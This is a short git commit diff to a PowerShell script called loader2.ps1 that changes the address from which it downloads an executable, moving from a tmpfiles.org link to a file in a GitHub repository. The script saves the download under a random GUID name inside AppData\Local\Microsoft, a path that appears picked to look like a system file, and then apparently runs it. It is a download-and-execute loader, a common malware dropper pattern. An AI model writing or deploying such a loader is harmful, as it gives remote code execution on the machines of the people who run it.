9d2bef872eb905b6bd677d3b0d85a40a9e56ed1a
xxuavails <hfigo6441@gmail.com>
2025-09-19 21:23:22 +0300

    Update loader2.ps1

--- loader2.ps1
+++ loader2.ps1
@@ -1,4 +1,4 @@
-$exeUrl = "http://tmpfiles.org/dl/1235390/messageboxtest.exe";
+$exeUrl = "https://github.com/xxuavails/diagnosis/blob/main/Meseg.exe";
 $tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";
 
 try {
@@ -12,5 +12,6 @@ try {
 } catch {
     Write-Error "Execution failed: $_";
 }
+
 
 
